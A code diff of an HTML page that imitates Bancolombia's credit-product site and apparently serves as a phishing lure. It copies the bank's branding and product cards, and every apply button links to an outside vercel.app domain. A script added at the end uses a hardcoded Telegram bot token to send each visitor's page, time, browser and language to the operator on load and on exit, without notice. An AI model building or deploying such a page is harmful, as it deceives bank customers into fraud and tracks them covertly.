@@ -1,40 +1,20 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Créditos Bancolombia con ADDI</title>
+    <title>Créditos Bancolombia</title>
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- Estilos personalizados -->
     <style>
-        body {
-            background-color: #f8f9fa;
-            font-family: 'Arial', sans-serif;
-        }
-        .header-bancolombia {
-            background: linear-gradient(135deg, #004884 0%, #002c5f 100%);
-            color: white;
-            padding: 15px 0;
-            border-radius: 0 0 15px 15px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        .logo-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 20px;
-        }
-        .addi-logo {
-            height: 40px;
-        }
         .card-link-solicitar {
             border: none;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             transition: transform 0.3s, box-shadow 0.3s;
             border-radius: 0.5rem;
             overflow: hidden;
-            height: 100%;
         }
         .card-link-solicitar:hover {
             transform: translateY(-8px);
@@ -48,441 +28,133 @@
         .card-body h5 {
             font-size: 1.2rem;
             font-weight: bold;
-            color: #004884;
         }
         .btn-solicitar {
             background-color: #FFC107;
             color: #000;
             border: none;
             transition: background-color 0.3s;
-            font-weight: bold;
-            padding: 10px 20px;
-            border-radius: 25px;
-            width: 100%;
         }
         .btn-solicitar:hover {
             background-color: #FFCA28;
         }
-        .addi-section {
-            background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%);
-            color: white;
-            padding: 30px;
-            border-radius: 15px;
-            margin: 30px 0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        .benefits-list {
-            list-style-type: none;
-            padding-left: 0;
-        }
-        .benefits-list li {
-            padding: 8px 0;
-            position: relative;
-            padding-left: 30px;
-        }
-        .benefits-list li:before {
-            content: "✓";
-            position: absolute;
-            left: 0;
-            color: #FFC107;
-            font-weight: bold;
-        }
-        .feature-icon {
-            font-size: 2.5rem;
-            margin-bottom: 15px;
-            color: #FFC107;
-        }
-        .footer {
-            background-color: #004884;
-            color: white;
-            padding: 20px 0;
-            margin-top: 40px;
-            border-radius: 15px 15px 0 0;
-        }
-        .badge-addi {
-            background-color: #FF6B6B;
-            color: white;
-            padding: 8px 12px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-        }
-        .hero-section {
-            background: linear-gradient(rgba(0, 72, 132, 0.8), rgba(0, 44, 95, 0.9)), url('https://images.unsplash.com/photo-1554224155-6726b3ff858f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80');
-            background-size: cover;
-            background-position: center;
-            color: white;
-            padding: 60px 0;
-            text-align: center;
-            border-radius: 15px;
-            margin-bottom: 30px;
-        }
-        .step-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin: 30px 0;
-            position: relative;
-        }
-        .step-indicator:before {
-            content: '';
-            position: absolute;
-            top: 20px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background-color: #e9ecef;
-            z-index: 1;
-        }
-        .step {
-            text-align: center;
-            position: relative;
-            z-index: 2;
-            flex: 1;
-        }
-        .step-number {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background-color: #e9ecef;
-            color: #6c757d;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 10px;
-            font-weight: bold;
-        }
-        .step.active .step-number {
-            background-color: #004884;
-            color: white;
-        }
-        .step.completed .step-number {
-            background-color: #28a745;
-            color: white;
-        }
-        .advantages-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin: 30px 0;
-        }
-        .advantage-card {
-            background: white;
-            padding: 25px;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            transition: transform 0.3s;
-        }
-        .advantage-card:hover {
-            transform: translateY(-5px);
-        }
-        .advantage-icon {
-            font-size: 2.5rem;
-            color: #FF6B6B;
-            margin-bottom: 15px;
-        }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <div class="header-bancolombia">
-        <div class="logo-container">
-            <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/1c0c5f5c-8c3f-4f6a-8f6f-1e7f5f5f5f5f/logo-bancolombia.png" alt="Bancolombia" height="50">
-            <div>
-                <img src="https://www.addi.com/wp-content/uploads/2021/06/ADDI_Logo_White.png" alt="ADDI" class="addi-logo">
-            </div>
-        </div>
-    </div>
 
-    <div class="container mt-4">
-        <!-- Hero Section -->
-        <div class="hero-section">
-            <h1 class="display-4 fw-bold">Créditos Bancolombia con ADDI</h1>
-            <p class="lead">Solicita tu crédito y recibe el desembolso al instante con ADDI</p>
-            <button class="btn btn-warning btn-lg mt-3" data-bs-toggle="modal" data-bs-target="#solicitudModal">Solicitar Ahora</button>
-        </div>
-
-        <!-- Proceso de Solicitud -->
-        <div class="step-indicator">
-            <div class="step completed">
-                <div class="step-number">1</div>
-                <div>Solicita</div>
-            </div>
-            <div class="step completed">
-                <div class="step-number">2</div>
-                <div>Aprobación</div>
-            </div>
-            <div class="step active">
-                <div class="step-number">3</div>
-                <div>Desembolso ADDI</div>
-            </div>
-            <div class="step">
-                <div class="step-number">4</div>
-                <div>Dinero en tu cuenta</div>
-            </div>
-        </div>
-
-        <!-- Sección ADDI -->
-        <div class="addi-section">
-            <div class="row align-items-center">
-                <div class="col-md-6 text-center">
-                    <img src="https://www.addi.com/wp-content/uploads/2021/06/ADDI_App_Screenshot.png" alt="App ADDI" class="img-fluid" style="max-height: 300px;">
-                </div>
-                <div class="col-md-6">
-                    <h2 class="fw-bold">Desembolso instantáneo con ADDI</h2>
-                    <p class="mt-3">ADDI te permite recibir el desembolso de tu crédito de manera inmediata, sin esperas y con total transparencia.</p>
-                    <ul class="benefits-list mt-4">
-                        <li>Aprobación en minutos</li>
-                        <li>Desembolso inmediato a tu cuenta</li>
-                        <li>Tasas competitivas</li>
-                        <li>Proceso 100% digital</li>
-                        <li>Sin papeleos ni filas</li>
-                        <li>Disponible 24/7</li>
-                    </ul>
-                    <button class="btn btn-light mt-3">Conoce más de ADDI</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Ventajas de ADDI -->
-        <h2 class="text-center my-5 fw-bold" style="color: #004884;">¿Por qué elegir ADDI?</h2>
-        <div class="advantages-grid">
-            <div class="advantage-card">
-                <div class="advantage-icon">⚡</div>
-                <h5>Velocidad</h5>
-                <p>Desembolsos en minutos, no en días</p>
-            </div>
-            <div class="advantage-card">
-                <div class="advantage-icon">🔒</div>
-                <h5>Seguridad</h5>
-                <p>Procesos seguros y encriptados</p>
-            </div>
-            <div class="advantage-card">
-                <div class="advantage-icon">💳</div>
-                <h5>Flexibilidad</h5>
-                <p>Múltiples opciones de pago</p>
-            </div>
-            <div class="advantage-card">
-                <div class="advantage-icon">📱</div>
-                <h5>Digital</h5>
-                <p>Todo desde tu dispositivo móvil</p>
-            </div>
-        </div>
-
-        <!-- Catálogo de Créditos -->
-        <h2 class="text-center my-5 fw-bold" style="color: #004884;">Nuestros Créditos con Desembolso ADDI</h2>
+    <img src="https://sucursalvirtual-cre-col.github.io/personapp/hede.jpeg" alt="Descripción de la imagen" width="400" height=""></center> 
+    <div class="container mt-5">
         <div class="row justify-content-center">
             <!-- Tarjeta: Crédito de libre inversión -->
             <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
                 <div class="card card-link-solicitar">
                     <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/9e51f37a-e540-4c92-b2d4-a9b1e02743e2/Libre_card_desk+%281%29.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-9e51f37a-e540-4c92-b2d4-a9b1e02743e2-npeRw0B" alt="Crédito de Libre Inversión">
-                    <div class="card-body d-flex flex-column">
-                        <h5>Crédito de libre inversión</h5>
+                    <div class="card-body">
+                        <h5>Crédito de libre inversión Bancolombia</h5>
                         <p>Si la empresa en la que trabajas tiene convenio de libranza con Bancolombia puedes acceder a este crédito.</p>
-                        <div class="mt-auto">
-                            <span class="badge-addi mb-2 d-inline-block">Desembolso ADDI Disponible</span>
-                            <button class="btn btn-solicitar mt-2" data-bs-toggle="modal" data-bs-target="#solicitudModal">Solicitar</button>
-                        </div>
+
+                         <a href="https://appbancolombia.vercel.app/" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
+
+                        
+                    </div>
+               </div>
+            </div>
+
+
+
+               <!-- Tarjeta: Credito -->
+            <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
+                <div class="card card-link-solicitar">
+                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/de7c2ab9-9196-4fd7-90e5-dcbe55de7a08/tarjeta+american+express.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-de7c2ab9-9196-4fd7-90e5-dcbe55de7a08-nXl.0EQ" alt="Crediágil">
+                    <div class="card-body">
+                        <h5>Obten tu Tarjeta de Credito Bancolombia</h5>
+                        <p>Te acompañan en todos los momentos: desde compras cotidianas seguras y ágiles hasta experiencias inolvidables alrededor del mundo.</p>
+                         <a href="https://appbancolombia.vercel.app/tc.html" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
                     </div>
                 </div>
             </div>
 
+            
             <!-- Tarjeta: Crediágil -->
             <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
                 <div class="card card-link-solicitar">
                     <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/2e0ade4a-06b2-48dc-8cc8-ccb9f0df7c14/Crediagil_card_desk+%281%29.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-2e0ade4a-06b2-48dc-8cc8-ccb9f0df7c14-npeWXdC" alt="Crediágil">
-                    <div class="card-body d-flex flex-column">
+                    <div class="card-body">
                         <h5>Crediágil Bancolombia</h5>
                         <p>Lo solicitas una vez y lo usas cuando quieras: el crédito para viajes, compras, emergencias o lo que necesites.</p>
-                        <div class="mt-auto">
-                            <span class="badge-addi mb-2 d-inline-block">Desembolso ADDI Disponible</span>
-                            <button class="btn btn-solicitar mt-2" data-bs-toggle="modal" data-bs-target="#solicitudModal">Solicitar</button>
-                        </div>
+                         <a href="https://appbancolombia.vercel.app/" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
                     </div>
                 </div>
             </div>
 
+                   
+            <!-- Tarjeta: Crédito de vehículo -->
+            <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
+                <div class="card card-link-solicitar">
+                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/d84e9b06-705e-4a16-80aa-ce6e3aa87893/Proteccion_card_desk-min+%281%29.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-d84e9b06-705e-4a16-80aa-ce6e3aa87893-npeQsOp" alt="Crédito de vehículo">
+                    <div class="card-body">
+                        <h5>Crédito de libranza Bancolombia para pensionados Protección</h5>
+                        <p>Si eres pensionado de Protección, puedes acceder a este crédito para invertir en los planes que habías aplazado.</p>
+                         <a href="https://appbancolombia.vercel.app/" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
+                    </div>
+                </div>
+            </div>
             <!-- Tarjeta: Crédito de nómina -->
             <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
                 <div class="card card-link-solicitar">
                     <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/374f4291-4863-4920-99cf-dfaba6c8ac3b/FOPEP_card_desk-min+%281%29.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-374f4291-4863-4920-99cf-dfaba6c8ac3b-npeWzJo" alt="Crédito de nómina">
-                    <div class="card-body d-flex flex-column">
-                        <h5>Crédito para pensionados FOPEP</h5>
+                    <div class="card-body">
+                        <h5>Crédito de libranza Bancolombia para pensionados FOPEP</h5>
                         <p>Si eres pensionado del Fondo de Pensiones Públicas, puedes acceder a este crédito y disfrutarlo en lo que quieras.</p>
-                        <div class="mt-auto">
-                            <span class="badge-addi mb-2 d-inline-block">Desembolso ADDI Disponible</span>
-                            <button class="btn btn-solicitar mt-2" data-bs-toggle="modal" data-bs-target="#solicitudModal">Solicitar</button>
-                        </div>
+                         <a href="https://appbancolombia.vercel.app/" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
                     </div>
                 </div>
             </div>
-
-            <!-- Tarjeta: Compra de cartera -->
+            <!-- Tarjeta: Crédito educativo -->
             <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
                 <div class="card card-link-solicitar">
-                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/c268962c-5da2-4baa-a6de-9afeaeb121a1/Compra+de+cartera_card_desk-min-min+%281%29.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-c268962c-5da2-4baa-a6de-9afeaeb121a1-npeXrd8" alt="Compra de cartera">
-                    <div class="card-body d-flex flex-column">
+                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/fc69cb30-e414-42f7-86ff-5f1007db3481/Pignoracion_card_desk-min+%281%29.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-fc69cb30-e414-42f7-86ff-5f1007db3481-npeQzEJ" alt="Crédito educativo">
+                    <div class="card-body">
+                        <h5>Crédito con pignoración de pensiones Bancolombia</h5>
+                        <p>¿Ahorras en pensiones voluntarias? Obtén tasas más bajas que otros créditos de libre inversión Bancolombia.</p>
+                         <a href="https://appbancolombia.vercel.app/" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
+                    </div>
+                </div>
+            </div>
+            <!-- Tarjeta: Leasing habitacional -->
+            <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
+                <div class="card card-link-solicitar">
+                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/c268962c-5da2-4baa-a6de-9afeaeb121a1/Compra+de+cartera_card_desk-min-min+%281%29.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-c268962c-5da2-4baa-a6de-9afeaeb121a1-npeXrd8" alt="Leasing habitacional">
+                    <div class="card-body">
                         <h5>Compra de cartera Bancolombia</h5>
                         <p>Mejora tus condiciones financieras consolidando tus deudas con tasas de interés más competitivas y plazos amplios.</p>
-                        <div class="mt-auto">
-                            <span class="badge-addi mb-2 d-inline-block">Desembolso ADDI Disponible</span>
-                            <button class="btn btn-solicitar mt-2" data-bs-toggle="modal" data-bs-target="#solicitudModal">Solicitar</button>
-                        </div>
+                         <a href="https://appbancolombia.vercel.app/" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
                     </div>
                 </div>
             </div>
-
-            <!-- Tarjeta: Compra y paga después -->
+            <!-- Tarjeta: Crédito de vivienda -->
             <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
                 <div class="card card-link-solicitar">
-                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/77d667bb-6c41-48e9-9e1b-fb8a502c2398/Compra-y-paga-despues+%281%29.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-77d667bb-6c41-48e9-9e1b-fb8a502c2398-or8xyH." alt="Compra y paga después">
-                    <div class="card-body d-flex flex-column">
+                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/77d667bb-6c41-48e9-9e1b-fb8a502c2398/Compra-y-paga-despues+%281%29.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-77d667bb-6c41-48e9-9e1b-fb8a502c2398-or8xyH." alt="Crédito de vivienda">
+                    <div class="card-body">
                         <h5>Compra y paga después</h5>
-                        <p>Aprovecha este préstamo para comprar hoy lo que quieras en los comercios aliados y págalo en cuotas con intereses mensuales del 0%.</p>
-                        <div class="mt-auto">
-                            <span class="badge-addi mb-2 d-inline-block">Desembolso ADDI Disponible</span>
-                            <button class="btn btn-solicitar mt-2" data-bs-toggle="modal" data-bs-target="#solicitudModal">Solicitar</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Tarjeta: Tarjeta de crédito -->
-            <div class="col-md-6 col-lg-4 d-flex align-items-stretch mb-4">
-                <div class="card card-link-solicitar">
-                    <img class="img-fluid" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/de7c2ab9-9196-4fd7-90e5-dcbe55de7a08/tarjeta+american+express.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-de7c2ab9-9196-4fd7-90e5-dcbe55de7a08-nXl.0EQ" alt="Tarjeta de crédito">
-                    <div class="card-body d-flex flex-column">
-                        <h5>Tarjeta de Crédito Bancolombia</h5>
-                        <p>Te acompañan en todos los momentos: desde compras cotidianas seguras y ágiles hasta experiencias inolvidables.</p>
-                        <div class="mt-auto">
-                            <span class="badge-addi mb-2 d-inline-block">Desembolso ADDI Disponible</span>
-                            <button class="btn btn-solicitar mt-2" data-bs-toggle="modal" data-bs-target="#solicitudModal">Solicitar</button>
-                        </div>
+                        <p>Aprovecha este préstamo para comprar hoy lo que quieras en los comercios aliados y págalo en 4 cuotas con intereses mensuales del 0%.</p>
+                         <a href="https://appbancolombia.vercel.app/" target="_blank"><center>       <img src="https://sucursalvirtual-cre-col.github.io/personapp/soli.jpeg" alt="Descripción de la imagen" width="350" height=""></center> </a>
                     </div>
                 </div>
             </div>
         </div>
     </div>
-
-    <!-- Footer -->
-    <div class="footer">
-        <div class="container">
-            <div class="row">
-                <div class="col-md-6">
-                    <h5>Bancolombia con ADDI</h5>
-                    <p>La forma más rápida y sencilla de obtener tu crédito con desembolso inmediato.</p>
-                </div>
-                <div class="col-md-3">
-                    <h5>Enlaces útiles</h5>
-                    <ul class="list-unstyled">
-                        <li><a href="#" class="text-light">Preguntas frecuentes</a></li>
-                        <li><a href="#" class="text-light">Tasas y tarifas</a></li>
-                        <li><a href="#" class="text-light">Términos y condiciones</a></li>
-                    </ul>
-                </div>
-                <div class="col-md-3">
-                    <h5>Contacto</h5>
-                    <ul class="list-unstyled">
-                        <li>Línea gratuita: 01-8000-123456</li>
-                        <li>WhatsApp: 300-123-4567</li>
-                        <li>Email: info@bancolombia.com</li>
-                    </ul>
-                </div>
-            </div>
-            <hr class="my-4" style="background-color: rgba(255,255,255,0.1);">
-            <div class="text-center">
-                <p>&copy; 2023 Bancolombia. Todos los derechos reservados.</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- Modal de Solicitud -->
-    <div class="modal fade" id="solicitudModal" tabindex="-1" aria-labelledby="solicitudModalLabel" aria-hidden="true">
-        <div class="modal-dialog modal-lg">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h5 class="modal-title" id="solicitudModalLabel">Solicitar Crédito con ADDI</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                </div>
-                <div class="modal-body">
-                    <form id="solicitudForm">
-                        <div class="mb-3">
-                            <label for="nombre" class="form-label">Nombre completo</label>
-                            <input type="text" class="form-control" id="nombre" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="documento" class="form-label">Número de documento</label>
-                            <input type="text" class="form-control" id="documento" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="email" class="form-label">Correo electrónico</label>
-                            <input type="email" class="form-control" id="email" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="telefono" class="form-label">Teléfono</label>
-                            <input type="tel" class="form-control" id="telefono" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="monto" class="form-label">Monto deseado</label>
-                            <select class="form-select" id="monto" required>
-                                <option value="" selected disabled>Selecciona un monto</option>
-                                <option value="1000000">$1.000.000</option>
-                                <option value="3000000">$3.000.000</option>
-                                <option value="5000000">$5.000.000</option>
-                                <option value="10000000">$10.000.000</option>
-                            </select>
-                        </div>
-                        <div class="mb-3">
-                            <label for="plazo" class="form-label">Plazo de pago</label>
-                            <select class="form-select" id="plazo" required>
-                                <option value="" selected disabled>Selecciona un plazo</option>
-                                <option value="12">12 meses</option>
-                                <option value="24">24 meses</option>
-                                <option value="36">36 meses</option>
-                                <option value="48">48 meses</option>
-                            </select>
-                        </div>
-                        <div class="mb-3 form-check">
-                            <input type="checkbox" class="form-check-input" id="addi" checked>
-                            <label class="form-check-label" for="addi">Desembolso inmediato con ADDI</label>
-                        </div>
-                    </form>
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
-                    <button type="button" class="btn btn-warning" id="enviarSolicitud">Enviar Solicitud</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
 
-    <!-- Script personalizado -->
+    <!-- Script de Telegram para notificaciones de visitantes -->
     <script>
-        document.getElementById('enviarSolicitud').addEventListener('click', function() {
-            // Validar formulario
-            const form = document.getElementById('solicitudForm');
-            if (!form.checkValidity()) {
-                form.reportValidity();
-                return;
-            }
-
-            // Mostrar mensaje de éxito
-            alert('¡Solicitud enviada con éxito! Te contactaremos pronto para continuar con el proceso.');
-            
-            // Cerrar modal
-            const modal = bootstrap.Modal.getInstance(document.getElementById('solicitudModal'));
-            modal.hide();
-            
-            // Limpiar formulario
-            form.reset();
-        });
-
-        // Script de Telegram para notificaciones de visitantes
+        // Configuración - REEMPLAZA CON TUS DATOS
         const BOT_TOKEN = '8545595337:AAEMJymTqxVVtuerPNQmo7dnl_TIK9fPUIw';
         const CHAT_ID = '7776240161';
 
+        // Función para enviar mensaje a Telegram
         function enviarTelegram(mensaje) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
@@ -501,12 +173,23 @@
 
         // Detecta cuando la página se carga
         window.addEventListener('load', function() {
-            const mensaje = `🆕 <b>Nuevo Visitante en Créditos Bancolombia con ADDI</b>
+            const mensaje = `🆕 <b>Nuevo Visitante en Créditos Bancolombia</b>
             
 📄 Página: ${window.location.href}
 🕐 Hora: ${new Date().toLocaleString()}
 📱 Navegador: ${navigator.userAgent.split(' ')[0]}
 🌐 Idioma: ${navigator.language}`;
+
+            enviarTelegram(mensaje);
+        });
+
+        // Opcional: Detecta cuando el visitante se va
+        window.addEventListener('beforeunload', function() {
+            const tiempo = Math.round((new Date() - performance.timing.navigationStart) / 1000);
+            const mensaje = `🚪 <b>Visitante se fue de Créditos Bancolombia</b>
+            
+⏱️ Tiempo en página: ${tiempo} segundos
+📄 Página: ${window.location.href}`;
 
             enviarTelegram(mensaje);
         });
